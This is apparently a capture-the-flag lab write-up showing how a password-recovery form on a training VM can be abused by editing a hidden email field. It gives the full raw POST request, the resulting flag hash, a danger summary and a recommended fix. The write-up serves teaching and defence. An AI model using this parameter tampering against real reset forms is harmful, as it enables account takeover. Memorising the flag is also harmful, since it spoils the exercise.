# Mail recovery interception

## Description
at url : http://192.168.56.101/?page=recover \
If we inspect the page html, in the form to submit to ask for a password recovery, \
we can see that some values are hidden but accessible:\
name="mail" and value="webmaster@borntosec.com".

editing those values before sending the form gives us the flag:
1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0\
(recoverthis, encrypted in sha256)
## Step to reproduce
Sending the http request:
```
POST /?page=recover HTTP/1.1
Host: 192.168.56.101
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Origin: http://192.168.56.101
Connection: keep-alive
Referer: http://192.168.56.101/?page=recover
Cookie: I_am_admin=68934a3e9455fa72420237eb05902327
Upgrade-Insecure-Requests: 1
Priority: u=0, i
mail=mymail%40hack.com&Submit=Submit
```
Make the flag appear on the new page.

## Danger
If we can ask that the password recovery from another user is send to our mail, we can take control of another user account.

## Recommanded fix
Not having the user send the email value in the POST request, even hidden in the html.\
If the website can retrieve the email associated with the account name, it doesn't need to have that value in the form at all.
